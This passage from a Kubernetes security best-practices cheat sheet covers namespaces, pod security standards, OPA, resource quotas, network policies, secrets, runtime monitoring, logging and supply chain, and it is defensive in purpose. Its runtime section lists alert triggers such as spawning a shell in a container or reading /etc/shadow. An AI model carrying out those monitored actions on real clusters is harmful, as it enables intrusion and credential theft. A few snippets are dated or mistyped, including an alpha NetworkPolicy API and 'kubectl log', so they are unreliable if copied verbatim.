## SECTION 4: Kubernetes Security Best Practices: Deploy Phase

Once a Kubernetes infrastructure is in place, you must configure it securely before any workloads are deployed. And as you configure your infrastructure, ensure that you have visibility into what CIs are being deployed and how they are being deployed or else you will not be able to identify and respond to security policy violations. Before deployment, your system should know and be able to tell you:

- **What is being deployed** - including information about the image being used, such as components or vulnerabilities, and the pods that will be deployed.
- **Where it is going to be deployed** - which clusters, namespaces, and nodes.
- **How it is deployed** - whether it runs privileged, what other deployments it can communicate with, the pod security context that is applied, if any.
- **What it can access** - including secrets, volumes, and other infrastructure components such as the host or orchestrator API.
- **Is it compliant?** - whether it complies with your policies and security requirements.

--

### Code that uses namespaces to isolate Kubernetes resources

Namespaces give you the ability to create logical partitions, enforce separation of your resources and limit the scope of user permissions.

--

#### Setting the namespace for a request

To set the namespace for a current request, use the --namespace flag. Refer to the following examples:

```bash
kubectl run nginx --image=nginx --namespace=<insert-namespace-name-here>
kubectl get pods --namespace=<insert-namespace-name-here>
```

--

#### Setting the namespace preference

You can permanently save the namespace for all subsequent kubectl commands in that context with:

```bash
kubectl config set-context --current --namespace=<insert-namespace-name-here>
```

Then validate it with the following command:

```bash
kubectl config view --minify | grep namespace:
```

Learn more about namespaces at <https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces>

--

### Use the ImagePolicyWebhook to govern image provenance

We strongly recommend that you use the admission controller ImagePolicyWebhook to prevent unapproved images from being used, reject pods that use unapproved images, and refuse CIs that meet the following criteria:

- Images that haven’t been scanned recently
- Images that use a base image that’s not explicitly allowed
- Images from insecure registries

Learn more about webhook at <https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#imagepolicywebhook>

--

### Implement continuous security vulnerability scanning

Since new vulnerabilities are always being discovered, you may not always know if your containers may have recently-disclosed vulnerabilities (CVEs) or outdated packages. To maintain a strong security posture, do regular production scanning of first-party containers (applications you have built and previously scanned) as well as third-party containers (which are sourced from trusted repository and vendors).

Open Source projects such as [ThreatMapper](https://github.com/deepfence/ThreatMapper) can assist in identifying and prioritizing vulnerabilities.

--

### Apply security context to your pods and containers

The security context is a property that is defined in the deployment yaml and controls the security parameters for all pod/container/volumes, and it should be applied throughout your infrastructure. When the security context property is properly implemented everywhere, it can eliminate entire classes of attacks that rely on privileged access. For example, any attack that depends on installing software or writing to the file system will be stopped if you specify read-only root file systems in the security context.

When you are configuring the security context for your pods, only grant the privileges that are needed for the resources to function in your containers and volumes. Some of the important parameters in the security context property are:

Security Context Settings:

1. SecurityContext->**runAsNonRoot**  
   Description: Indicates that containers should run as non-root user.

2. SecurityContext->**Capabilities**  
   Description: Controls the Linux capabilities assigned to the container.

3. SecurityContext->**readOnlyRootFilesystem**  
   Description: Controls whether a container will be able to write into the root filesystem.

4. PodSecurityContext->**runAsNonRoot**  
   Description: Prevents running a container with 'root' user as part of the pod |

#### Security context example: A pod definition that includes security context parameters

```yaml
apiVersion: v1

kind: Pod
metadata:
  name: hello-world
spec:
  containers:
  # specification of the pod’s containers
  # ...
  # ...
  # Security Context
  securityContext:
    readOnlyRootFilesystem: true
    runAsNonRoot: true
```

For more information on security context for Pods, refer to the documentation at <https://kubernetes.io/docs/tasks/configure-pod-container/security-context>

--

### Continuously assess the privileges used by containers

We strongly recommend that all your containers should adhere to the principle of least privilege, since your security risk is heavily influenced by the capabilities, role bindings, and privileges given to containers. Each container should only have the minimum privileges and capabilities that allows it to perform its intended function.

#### Utilize Pod Security Standards and the Built-in Pod Security Admission Controller to enforce container privilege levels

Pod Security Standards combined with the Pod Security Admission Controller allow cluster administrators to enforce requirements on a pods `securityContext` fields. Three Pod Security Standard profiles exist:

- **Privileged**: Unrestricted, allows for known privilege escalations. Intended for use with system and infrastructure level workloads that require privilege to operate properly. All securityContext settings are permitted
- **Baseline**: Minimally restrictive policy designed for common containerized workloads while preventing known privilege escalations. Targeted at developers and operators of non-critical applications. The most dangerous securityContext settings, such as securityContext.privileged, hostPID, hostPath, hostIPC, are not permitted.
- **Restricted**: The most restrictive policy, designed to enforce current Pod hardening practices at the expense of some compatibility. Intended for security critical workloads or untrusted users. Restricted includes all of the enforcements from the baseline policy, in addition to much more restrictive requirements, such as requiring the dropping of all capabilities, enforcing runAsNotRoot, and more.

Each of the profiles have defined settings baselines that can be found in more detail [here](https://kubernetes.io/docs/concepts/security/pod-security-standards/#profile-details).

The Pod Security Admission Controller allows you to enforce, audit, or warn upon the violation of a defined policy. `audit` and `warn` modes can be utilized to determine if a particular Pod Security Standard would normally prevent the deployment of a pod when set to `enforce` mode.

Below is an example of a namespace that would only allow Pods to be deployed that conform to the restricted Pod Security Standard:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: policy-test
  labels:    
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

Cluster administrators should properly organize and and enforce policy on cluster namespaces, only permitting the privileged policy on namespaces where it is absolutely required, such as for critical cluster services that require access to the underlying host. Namespaces should be set to the lowest Pod Security Policy that can be enforced and supports their risk level.

If more granular policy enforcement is required beyond the three profiles (Privileged, Baseline, Restricted), Third party admission controllers like OPA Gatekeeper or Kyverno, or built-in Validating Admission Policy can be utilized.

#### Use Pod security policies to control the security-related attributes of pods, which includes container privilege levels

> **Warning**  
> Kubernetes deprecated Pod Security Policies in favor of Pod Security Standards and the Pod Security Admission Controller, and was removed from Kubernetes in v1.25. Consider using Pod Security Standards and the Pod Security Admission Controller instead.

All security policies should include the following conditions:

- Application processes do not run as root.
- Privilege escalation is not allowed.
- The root filesystem is read-only.
- The default (masked) /proc filesystem mount is used.
- The host network or process space should NOT be used - using `hostNetwork: true` will cause NetworkPolicies to be ignored since the Pod will use its host network.
- Unused and unnecessary Linux capabilities are eliminated.
- Use SELinux options for more fine-grained process controls.
- Give each application its own Kubernetes Service Account.
- If a container does not need to access the Kubernetes API, do not let it mount the service account credentials.

For more information on Pod security policies, refer to the documentation at <https://kubernetes.io/docs/concepts/policy/pod-security-policy/>.

--

### Providing extra security with a service mesh

A service mesh is an infrastructure layer that can handle communications between services in applications quickly, securely and reliably, which can help reduce the complexity of managing microservices and deployments. They provide a uniform way to secure, connect and monitor microservices. and a service mesh is great at resolving operational challenges and issues when running those containers and microservices.

#### Advantages of a service mesh

A service mesh provides the following advantages:

1. Observability

It generates tracing and telemetry metrics, which make it easy to understand your system and quickly root cause any problems.

2. Specialized security features

It provides security features which quickly identify any compromising traffic that enters your cluster and can secure the services inside your network if they are properly implemented. It can also help you manage security through mTLS, ingress and egress control, and more.

3. Ability to secure microservices with mTLS

Since securing microservices is hard, there are many tools that address microservices security. However, the service mesh is the most elegant solution for addressing encryption of on-the-wire traffic within the network.

It provides defense with mutual TLS (mTLS) encryption of the traffic between your services, and the mesh can automatically encrypt and decrypt requests and responses, which removes that burden from application developers. The mesh can also improve performance by prioritizing the reuse of existing, persistent connections, which reduces the need for the computationally expensive creation of new ones. With service mesh, you can secure traffic over the wire and also make strong identity-based authentication and authorizations for each microservice.

We see that a service mesh has a lot of value of enterprise companies, because a mesh allows you to see whether mTLS is enabled and working between each of your services. Also, you can get immediate alerts if the security status changes.

4. Ingress & egress control

It allows you to monitor and address compromising traffic as it passes through the mesh. For example, if Istio integrates with Kubernetes as an ingress controller, it can take care of load balancing for ingress. This allows defenders to add a level of security at the perimeter with ingress rules, while egress control allows you to see and manage external services and control how your services interact with traffic.

5. Operational Control

It can help security and platform teams set the right macro controls to enforce access controls, while allowing developers to make customizations they need to move quickly within these guardrails.

6. Ability to manage RBAC

A service mesh can help defenders implement a strong Role Based Access Control (RBAC) system, which is arguably one of the most critical requirements in large engineering organizations. Even a secure system can be easily circumvented by over-privileged users or employees, and an RBAC system can:

- Restrict privileged users to least privileges necessary to perform job responsibilities
- Ensure that access to systems are set to “deny all” by default
- Help developers make sure that proper documentation detailing roles and responsibilities are in place, which is one of the most critical security concerns in the enterprise.

#### Disadvantages of the security mesh

Though a service mesh has many advantages, they also bring in a unique set of challenges and a few of them are listed below:

- Adds A New Layer of Complexity

When proxies, sidecars and other components are introduced an already sophisticated environment, it dramatically increases the complexity of development and operations.

- Additional Expertise Is Required

If a mesh like Istio is added on top of an orchestrator such as Kubernetes, operators need to become experts in both technologies.

- Infrastructure Can Be Slowed

Because a service mesh is an invasive and intricate technology, it can significantly slow down an architecture.

- Requires Adoption of Yet Another Platform

Since service meshes are invasive, they force developers and operators to adapt to a highly opinionated platform and conform to its rules.

### Implementing centralized policy management

There are numerous projects which are able to provide centralized policy management for a Kubernetes cluster, including the [Open Policy Agent](https://www.openpolicyagent.org/) (OPA) project, [Kyverno](https://kyverno.io/), or the [Validating Admission Policy](https://kubernetes.io/docs/reference/access-authn-authz/validating-admission-policy/) (a built-in feature released to general availability in 1.30). In order to provide an example with some depth, we will focus on OPA in this cheat sheet.

OPA was started in 2016 to unify policy enforcement across different technologies and systems, and it can be used to enforce policies on a platform like Kubernetes. Currently, OPA is part of CNCF as an incubating project. It can create a unified method of enforcing security policy in the stack. While developers can impose fine-grained control over the cluster with RBAC and Pod security policies, these technologies only apply to the cluster but not outside the cluster.

Since OPA is a general-purpose, domain-agnostic policy enforcement tool that is not based on any other project, the policy queries and decisions do not follow a specific format. Thus it can be integrated with APIs, the Linux SSH daemon, an object store like Ceph, and you can use any valid JSON data as request attributes as long as it provides the required data. OPA allows you to choose what is input and what is output--for example, you can opt to have OPA return a True or False JSON object, a number, a string, or even a complex data object.

#### Most common use cases of OPA

##### OPA for application authorization

OPA can provide developers with an already-developed authorization technology so the team doesn’t have to develop one from scratch. It uses a declarative policy language purpose built for writing and enforcing rules such as, “Alice can write to this repository,” or “Bob can update this account.” This technology provides a rich suite of tools that can allow developers to integrate policies into their applications and allow end users to also create policy for their tenants.

If you already have a homegrown application authorization solution, you may not want to swap in OPA. But if you want to improve developer efficiency by moving to a solution that scales with microservices and allows you to decompose monolithic apps, you’re going to need a distributed authorization system and OPA (or one of the related competitors) could be the answer.

##### OPA for Kubernetes admission control

Since Kubernetes gives developers tremendous control over the traditional silos of "compute, networking and storage," they can use it to set up their network exactly the way they want and set up storage exactly the way they want. But this means that administrators and security teams must make sure that developers don’t shoot themselves (or their neighbors) in the foot.

OPA can address these security concerns by allowing security to build policies that require all container images to be from trusted sources, prevent developers from running software as root, make sure storage is always marked with the encrypt bit and storage does not get deleted just because a pod gets restarted, that limits internet access, etc.

It can also allow administrators to make sure that policy changes don’t inadvertently do more damage than good. OPA integrates directly into the Kubernetes API server and it has complete authority to reject any resource that the admission policy says does not belong in a cluster—-whether it is compute-related, network-related, storage-related, etc. Moreover, policy can be run out-of-band to monitor results and OPA's policies can be exposed early in the development lifecycle (e.g. the CICD pipeline or even on developer laptops) if developers need feedback early.

##### OPA for service mesh authorization

And finally, OPA can regulate use of service mesh architectures. Often, administrators ensure that compliance regulations are satisfied by building policies into the service mesh even when modification to source code is involved. Even if you’re not embedding OPA to implement application authorization logic (the top use case discussed above), you can control the APIs microservices by putting authorization policies into the service mesh. But if you are motivated by security, you can implement policies in the service mesh to limit lateral movement within a microservice architecture.

### Limiting resource usage on a cluster

It is important to define resource quotas for containers in Kubernetes, since all resources in a Kubernetes cluster are created with unbounded CPU limits and memory requests/limits by default. If you run resource-unbound containers, your system will be in risk of Denial of Service (DoS) or “noisy neighbor” scenarios. Fortunately, OPA can use resource quotas on a namespace, which will limit the number or capacity of resources granted to that namespace and restrict that namespace by defining its CPU capacity, memory, or persistent disk space.

Additionally, the OPA can limit how many pods, services, or volumes exist in each namespace, and it can restrict the maximum or minimum size of some of the resources above. The resource quotas provide default limits when none are specified and prevent users from requesting unreasonably high or low values for commonly reserved resources like memory.

Below is an example of defining namespace resource quota in the appropriate yaml. It limits the number of pods in the namespace to 4, limits their CPU requests between 1 and 2 and memory requests between 1GB to 2GB.

`compute-resources.yaml`:

```yaml
apiVersion: v1
kind: ResourceQuota
metadata:
  name: compute-resources
spec:
  hard:
    pods: "4"
    requests.cpu: "1"
    requests.memory: 1Gi
    limits.cpu: "2"
    limits.memory: 2Gi
```

Assign a resource quota to namespace:

```bash
kubectl create -f ./compute-resources.yaml --namespace=myspace
```

For more information on configuring resource quotas, refer to the Kubernetes documentation at <https://kubernetes.io/docs/concepts/policy/resource-quotas/>.

### Use Kubernetes network policies to control traffic between pods and clusters

If your cluster runs different applications, a compromised application could attack other neighboring applications. This scenario might happen because Kubernetes allows every pod to contact every other pod by default. If ingress from an external network endpoint is allowed, the pod will be able to send its traffic to an endpoint outside the cluster.

It is strongly recommended that developers implement network segmentation, because it is a key security control that ensures that containers can only communicate with other approved containers and prevents attackers from pursuing lateral movement across containers. However, applying network segmentation in the cloud is challenging because of the “dynamic” nature of container network identities (IPs).

While users of Google Cloud Platform can benefit from automatic firewall rules, which prevent cross-cluster communication, other users can apply similar implementations by deploying on-premises using network firewalls or SDN solutions. Also, the Kubernetes Network SIG is working on methods that will greatly improve the pod-to-pod communication policies. A new network policy API should address the need to create firewall rules around pods, limiting the network access that a containerized can have.

The following is an example of a network policy that controls the network for “backend” pods, which only allows inbound network access from “frontend” pods:

```json
POST /apis/net.alpha.kubernetes.io/v1alpha1/namespaces/tenant-a/networkpolicys
{
  "kind": "NetworkPolicy",
  "metadata": {
    "name": "pol1"
  },
  "spec": {
    "allowIncoming": {
      "from": [{
        "pods": { "segment": "frontend" }
      }],
      "toPorts": [{
        "port": 80,
        "protocol": "TCP"
      }]
    },
    "podSelector": {
      "segment": "backend"
    }
  }
}
```

For more information on configuring network policies, refer to the Kubernetes documentation at <https://kubernetes.io/docs/concepts/services-networking/network-policies>.

### Securing data

#### Keep secrets as secrets

It is important to learn how sensitive data such as credentials and keys are stored and accessed in your infrastructure. Kubernetes keeps them in a "secret," which is a small object that contains sensitive data, like a password or token.

It is best for secrets to be mounted into read-only volumes in your containers, rather than exposing them as environment variables. Also, secrets must be kept separate from an image or pod or anyone with access to the image would have access to the secret as well, even though a pod is not able to access the secrets of another pod. Complex applications that handle multiple processes and have public access are especially vulnerable in this regard.

#### Encrypt secrets at rest

Always encrypt your backups using a well reviewed backup and encryption solution and consider using full disk encryption where possible, because the etcd database contains any information accessible via the Kubernetes API. Access to this database could provide an attacker with significant visibility into the state of your cluster.

Kubernetes supports encryption at rest, a feature introduced in 1.7, and v1 beta since 1.13, which will encrypt Secret resources in etcd and prevent parties with access to your etcd backups from viewing the content of those secrets. While this feature is currently beta, it offers an additional level of defense when backups are not encrypted or an attacker gains read access to etcd.

#### Alternatives to Kubernetes Secret resources

Since an external secrets manager can store and manage your secrets rather than storing them in Kubernetes Secrets, you may want to consider this security alternative. A manager provides a number of benefits over using Kubernetes Secrets, including the ability to handle secrets across multiple clusters (or clouds), and the ability to control and rotate secrets centrally.

For more information on Secrets and their alternatives, refer to the documentation at <https://kubernetes.io/docs/concepts/configuration/secret/>.

Also see the [Secrets Management](Secrets_Management_Cheat_Sheet.md) cheat sheet for more details and best practices on managing secrets.

#### Finding exposed secrets

We strongly recommend that you review the secret material present on the container against the principle of 'least privilege' and assess the risk posed by a compromise.

Remember that open-source tools such as [SecretScanner](https://github.com/deepfence/SecretScanner) and [ThreatMapper](https://github.com/deepfence/ThreatMapper) can scan container filesystems for sensitive resources, such as API tokens, passwords, and keys. Such resources would be accessible to any user who had access to the unencrypted container filesystem, whether during build, at rest in a registry or backup, or running.

---

## SECTION 5: Kubernetes Security Best Practices: Runtime Phase

When the Kubernetes infrastructure enters the runtime phase, containerized applications are exposed to a slew of new security challenges. You must gain visibility into your running environment so you can detect and respond to threats as they arise.

If you proactively secure your containers and Kubernetes deployments at the build and deploy phases, you can greatly reduce the likelihood of security incidents at runtime and the subsequent effort needed to respond to them.

First, monitor the most security-relevant container activities, including:

- Process activity
- Network communications among containerized services
- Network communications between containerized services and external clients and servers

Detecting anomalies by observing container behavior is generally easier in containers than in virtual machines because of the declarative nature of containers and Kubernetes. These attributes allow easier introspection into what you have deployed and its expected activity.

### Use Pod Security Admission to prevent risky containers/Pods from being deployed

The previously recommended [Pod Security Policy](https://kubernetes.io/docs/concepts/policy/pod-security-policy/) is deprecated and replaced by [Pod Security Admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/), a new feature that allows you to enforce security policies on pods in a Kubernetes cluster.

It is recommended to use the `baseline` level as a minimum security requirement for all pods to ensure a standard level of security across the cluster. However, clusters should strive to apply the `restricted` level which follows pod hardening best practices.

For more information on configuring Pod Security Admission, refer to the documentation at <https://kubernetes.io/docs/tasks/configure-pod-container/enforce-standards-admission-controller/>.

### Container Runtime Security

If containers are hardened containers at runtime, security teams have the ability to detect and respond to threats and anomalies while the containers or workloads are in a running state. Typically, this is carried out by intercepting the low-level system calls and looking for events that may indicate compromise. Some examples of events that should trigger an alert would include:

- A shell is run inside a container
- A container mounts a sensitive path from the host such as /proc
- A sensitive file is unexpectedly read in a running container such as /etc/shadow
- An outbound network connection is established

Open source tools such as Falco from Sysdig can help operators get up and running with container runtime security by providing defenders with a large number of out-of-the-box detections as well as the ability to create custom rules.

### Container Sandboxing

When container runtimes are permitted to make direct calls to the host kernel, the kernel often interacts with hardware and devices to respond to the request. Though Cgroups and namespaces give containers a certain amount of isolation, the kernel still presents a large attack surface. When defenders have to deal with multi-tenant and highly untrusted clusters, they often add additional layer of sandboxing to ensure that container breakout and kernel exploits are not present. Below, we will explore a few OSS technologies that help further isolate running containers from the host kernel:

- Kata Containers: Kata Containers is an OSS project that uses stripped-down VMs to keep the resource footprint minimal and maximize performance to ultimately isolate containers further.
- gVisor : gVisor is a more lightweight kernel than a VM (even stripped down). It is its own independent kernel written in Go and sits in the middle of a container and the host kernel. It is a strong sandbox--gVisor supports ~70% of the linux system calls from the container but ONLY uses about 20 system calls to the host kernel.
- Firecracker: It is a super lightweight VM that runs in user space. Since it is locked down by seccomp, cgroup, and namespace policies, the system calls are very limited. Firecracker is built with security in mind, however it may not support all Kubernetes or container runtime deployments.

### Preventing containers from loading unwanted kernel modules

Because Linux kernel automatically loads kernel modules from disk if needed in certain circumstances, such as when a piece of hardware is attached or a filesystem is mounted, this can be a significant attack surface. Of particular relevance to Kubernetes, even unprivileged processes can cause certain network-protocol-related kernel modules to be loaded, just by creating a socket of the appropriate type. This situation may allow attackers to exploit a security hole in kernel modules that the administrator assumed was not in use.

To prevent specific modules from being automatically loaded, you can uninstall them from the node, or add rules to block them. On most Linux distributions, you can do that by creating a file such as `/etc/modprobe.d/kubernetes-blacklist.conf` with contents like:

```conf
# DCCP is unlikely to be needed, has had multiple serious
# vulnerabilities, and is not well-maintained.
blacklist dccp

# SCTP is not used in most Kubernetes clusters, and has also had
# vulnerabilities in the past.
blacklist sctp
```

To block module loading more generically, you can use a Linux Security Module (such as SELinux) to completely deny the module_request permission to containers, preventing the kernel from loading modules for containers under any circumstances. (Pods would still be able to use modules that had been loaded manually, or modules that were loaded by the kernel on behalf of some more-privileged process).

### Compare and analyze different runtime activity in pods of the same deployments

When containerized applications are replicated for high availability, fault tolerance, or scale reasons, these replicas should behave nearly identically. If a replica has significant deviations from the others, defenders would want further investigation. Your Kubernetes security tool should be integrated with other external systems (email, PagerDuty, Slack, Google Cloud Security Command Center, SIEMs [security information and event management], etc.) and leverage deployment labels or annotations to alert the team responsible for a given application when a potential threat is detected. If you chose to use a commercial Kubernetes security vendor, they should support a wide array of integrations with external tools.

### Monitor network traffic to limit unnecessary or insecure communication

Containerized applications typically make extensive use of cluster networking, so observing active networking traffic is a good way to understand how applications interact with each other and identify unexpected communication. You should observe your active network traffic and compare that traffic to what is allowed based on your Kubernetes network policies.

At the same time, comparing the active traffic with what’s allowed gives you valuable information about what isn’t happening but is allowed. With that information, you can further tighten your allowed network policies so that it removes superfluous connections and decreases your overall attack surface.

Open source projects like <https://github.com/kinvolk/inspektor-gadget> or <https://github.com/deepfence/PacketStreamer> may help with this, and commercial security solutions provide varying degrees of container network traffic analysis.

### If breached, scale suspicious pods to zero

Contain a successful breach by using Kubernetes native controls to scale suspicious pods to zero or kill then restart instances of breached applications.

### Rotate infrastructure credentials frequently

The shorter the lifetime of a secret or credential, the harder it is for an attacker to make use of that credential. Set short lifetimes on certificates and automate their rotation. Use an authentication provider that can control how long issued tokens are available and use short lifetimes where possible. If you use service account tokens in external integrations, plan to rotate those tokens frequently. For example, once the bootstrap phase is complete, a bootstrap token used for setting up nodes should be revoked or its authorization removed.

### Logging

Kubernetes supplies cluster-based logging, which allows you to log container activity into a central log hub. When a cluster is created, the standard output and standard error output of each container can be ingested using a Fluentd agent running on each node (into either Google Stackdriver Logging or into Elasticsearch) and viewed with Kibana.

#### Enable audit logging

The audit logger is a beta feature that records actions taken by the API for later analysis in the event of a compromise. It is recommended to enable audit logging and archive the audit file on a secure server

Ensure logs that are monitoring for anomalous or unwanted API calls, especially any authorization failures (these log entries will have a status message “Forbidden”). Authorization failures could mean that an attacker is trying to abuse stolen credentials.

Managed Kubernetes providers, including GKE, provide access to this data in their cloud console and may allow you to set up alerts on authorization failures.

##### Audit logs

Audit logs can be useful for compliance as they should help you answer the questions of what happened, who did what and when. Kubernetes provides flexible auditing of kube-apiserver requests based on policies. These help you track all activities in chronological order.

Here is an example of an audit log:

```json
{
  "kind":"Event",
  "apiVersion":"audit.k8s.io/v1beta1",
  "metadata":{ "creationTimestamp":"2019-08-22T12:00:00Z" },
  "level":"Metadata",
  "timestamp":"2019-08-22T12:00:00Z",
  "auditID":"23bc44ds-2452-242g-fsf2-4242fe3ggfes",
  "stage":"RequestReceived",
  "requestURI":"/api/v1/namespaces/default/persistentvolumeclaims",
  "verb":"list",
  "user": {
    "username":"user@example.org",
    "groups":[ "system:authenticated" ]
  },
  "sourceIPs":[ "172.12.56.1" ],
  "objectRef": {
    "resource":"persistentvolumeclaims",
    "namespace":"default",
    "apiVersion":"v1"
  },
  "requestReceivedTimestamp":"2019-08-22T12:00:00Z",
  "stageTimestamp":"2019-08-22T12:00:00Z"
}
```

#### Define Audit Policies

Audit policy sets rules which define what events should be recorded and what data is stored when an event includes. The audit policy object structure is defined in the audit.k8s.io API group. When an event is processed, it is compared against the list of rules in order. The first matching rule sets the "audit level" of the event.

The known audit levels are:

- None - don't log events that match this rule
- Metadata - log request metadata (requesting user, timestamp, resource, verb, etc.) but not request or response body
- Request - log event metadata and request body but not response body. This does not apply for non-resource requests
- RequestResponse - log event metadata, request and response bodies. This does not apply for non-resource requests

You can pass a file with the policy to kube-apiserver using the --audit-policy-file flag. If the flag is omitted, no events are logged. Note that the rules field must be provided in the audit policy file. A policy with no (0) rules is treated as illegal.

#### Understanding Logging

One main challenge with logging Kubernetes is understanding what logs are generated and how to use them. Let’s start by examining the overall picture of Kubernetes' logging architecture.

##### Container logging

The first layer of logs that can be collected from a Kubernetes cluster are those being generated by your containerized applications. The easiest method for logging containers is to write to the standard output (stdout) and standard error (stderr) streams.

Manifest is as follows.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: example
      image: busybox
      args: [/bin/sh, -c, 'while true; do echo $(date); sleep 1; done']
```

To apply the manifest, run:

```bash
kubectl apply -f example.yaml
```

To take a look the logs for this container, run:

```bash
kubectl log <container-name> command.
```

For persisting container logs, the common approach is to write logs to a log file and then use a sidecar container. As shown below in the pod configuration above, a sidecar container will run in the same pod along with the application container, mounting the same volume and processing the logs separately.

An example of a Pod Manifest is seen below:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
  - name: example
    image: busybox
    args:
    - /bin/sh
    - -c
    - >
      while true;
      do
        echo "$(date)\n" >> /var/log/example.log;
        sleep 1;
      done
    volumeMounts:
    - name: varlog
      mountPath: /var/log
  - name: sidecar
    image: busybox
    args: [/bin/sh, -c, 'tail -f /var/log/example.log']
    volumeMounts:
    - name: varlog
      mountPath: /var/log
  volumes:
  - name: varlog
    emptyDir: {}
```

##### Node logging

When a container running on Kubernetes writes its logs to stdout or stderr streams, the container engine streams them to the logging driver set by the Kubernetes configuration.

In most cases, these logs will end up in the /var/log/containers directory on your host. Docker supports multiple logging drivers but unfortunately, driver configuration is not supported via the Kubernetes API.

Once a container is terminated or restarted, kubelet stores logs on the node. To prevent these files from consuming all of the host’s storage, the Kubernetes node implements a log rotation mechanism. When a container is evicted from the node, all containers with corresponding log files are evicted.

Depending on what operating system and additional services you’re running on your host machine, you might need to take a look at additional logs.

For example, systemd logs can be retrieved using the following command:

```bash
journalctl -u
```

##### Cluster logging

In the Kubernetes cluster itself, there is a long list of cluster components that can be logged as well as additional data types that can be used (events, audit logs). Together, these different types of data can give you visibility into how Kubernetes is performing as a system.

Some of these components run in a container, and some of them run on the operating system level (in most cases, a systemd service). The systemd services write to journald, and components running in containers write logs to the /var/log directory, unless the container engine has been configured to stream logs differently.

#### Events

Kubernetes events can indicate any Kubernetes resource state changes and errors, such as exceeded resource quota or pending pods, as well as any informational messages.

The following command returns all events within a specific namespace:

```bash
kubectl get events -n <namespace>

NAMESPACE LAST SEEN TYPE   REASON OBJECT MESSAGE
kube-system  8m22s  Normal   Scheduled            pod/metrics-server-66dbbb67db-lh865                                       Successfully assigned kube-system/metrics-server-66dbbb67db-lh865 to aks-agentpool-42213468-1
kube-system     8m14s               Normal    Pulling                   pod/metrics-server-66dbbb67db-lh865                                       Pulling image "aksrepos.azurecr.io/mirror/metrics-server-amd64:v0.2.1"
kube-system     7m58s               Normal    Pulled                    pod/metrics-server-66dbbb67db-lh865                                       Successfully pulled image "aksrepos.azurecr.io/mirror/metrics-server-amd64:v0.2.1"
kube-system     7m57s               Normal     Created                   pod/metrics-server-66dbbb67db-lh865                                       Created container metrics-server
kube-system     7m57s               Normal    Started                   pod/metrics-server-66dbbb67db-lh865                                       Started container metrics-server
kube-system     8m23s               Normal    SuccessfulCreate          replicaset/metrics-server-66dbbb67db             Created pod: metrics-server-66dbbb67db-lh865
```

The following command will show the latest events for this specific Kubernetes resource:

```bash
kubectl describe pod <pod-name>

Events:
  Type    Reason     Age   From                               Message
  ----    ------     ----  ----                               -------
  Normal  Scheduled  14m   default-scheduler                  Successfully assigned kube-system/coredns-7b54b5b97c-dpll7 to aks-agentpool-42213468-1
  Normal  Pulled     13m   kubelet, aks-agentpool-42213468-1  Container image "aksrepos.azurecr.io/mirror/coredns:1.3.1" already present on machine
  Normal  Created    13m   kubelet, aks-agentpool-42213468-1  Created container coredns
  Normal  Started    13m   kubelet, aks-agentpool-42213468-1  Started container coredns
```

## SECTION 5: Securing a managed-service Kubernetes on Cloud Service Provider

### AWS

There are few open source tools that can help you on securing your managed-service Kubernetes on AWS [(EKS)](https://aws.amazon.com/eks/)

- [hardeneks](https://github.com/aws-samples/hardeneks)
- [MKAD](https://github.com/DataDog/managed-kubernetes-auditing-toolkit) (Managed Kubernetes Auditing Toolkit) from DataDog

## SECTION 6: Supply Chain Security

Container supply chain security is critical for preventing attacks that exploit vulnerabilities in the software delivery process. A compromised supply chain can lead to malicious code being deployed into production environments, potentially affecting thousands of containers and applications.

Supply chain attacks in Kubernetes environments typically target:

- Base images and dependencies
- Build processes and CI/CD pipelines
- Container registries
- Deployment manifests and Helm charts
- Third-party libraries and packages

Recent high-profile attacks (SolarWinds, Codecov, ua-parser-js) demonstrate the severe impact of supply chain compromises.

### Best practices for securing the container supply chain

1. Use trusted base images: Start with minimal, verified base images from reputable sources to reduce vulnerabilities.
2. Implement image scanning: Regularly scan container images for vulnerabilities using tools like Clair, Trivy, or Aqua Security.
3. Secure CI/CD pipelines: Ensure that build processes are secure, with proper access controls and monitoring.
4. Sign and verify images: Use image signing tools like Notary or Cosign to ensure the integrity of container images.
5. Use private registries: Store container images in private registries with access controls to prevent unauthorized access.
6. Monitor for vulnerabilities: Continuously monitor for new vulnerabilities in dependencies and base images.
7. Implement runtime security: Use tools to monitor container behavior at runtime and detect anomalies.

## SECTION 7: Final Thoughts

### Embed security into the container lifecycle as early as possible

You must integrate security earlier into the container lifecycle and ensure alignment and shared goals between security and DevOps teams. Security can (and should) be an enabler that allows your developers and DevOps teams to confidently build and deploy applications that are production-ready for scale, stability and security.

### Use Kubernetes-native security controls to reduce operational risk

Leverage the native controls built into Kubernetes whenever available in order to enforce security policies so that your security controls don’t collide with the orchestrator. Instead of using a third-party proxy or shim to enforce network segmentation, you could use Kubernetes network policies to ensure secure network communication.

### Leverage the context that Kubernetes provides to prioritize remediation efforts

Note that manually triaging security incidents and policy violations is time consuming in sprawling Kubernetes environments.

For example, a deployment containing a vulnerability with severity score of 7 or greater should be moved up in remediation priority if that deployment contains privileged containers and is open to the Internet but moved down if it’s in a test environment and supporting a non-critical app.

---

![Kubernetes Architecture](../assets/Kubernetes_Architecture.png)

## References

Control plane documentation - <https://kubernetes.io>

1. Kubernetes Security Best Practices everyone must follow - <https://www.cncf.io/blog/2019/01/14/9-kubernetes-security-best-practices-everyone-must-follow>
2. Securing a Cluster - <https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster>
3. Security Best Practices for Kubernetes Deployment - <https://kubernetes.io/blog/2016/08/security-best-practices-kubernetes-deployment>
4. Kubernetes Security Best Practices - <https://phoenixnap.com/kb/kubernetes-security-best-practices>
5. Kubernetes Security 101: Risks and 29 Best Practices - <https://www.stackrox.com/post/2020/05/kubernetes-security-101>
6. 15 Kubernetes security best practice to secure your cluster - <https://www.mobilise.cloud/15-kubernetes-security-best-practice-to-secure-your-cluster>
7. The Ultimate Guide to Kubernetes Security - <https://neuvector.com/container-security/kubernetes-security-guide>
8. A hacker's guide to Kubernetes security - <https://techbeacon.com/enterprise-it/hackers-guide-kubernetes-security>
9. 11 Ways (Not) to Get Hacked - <https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked>
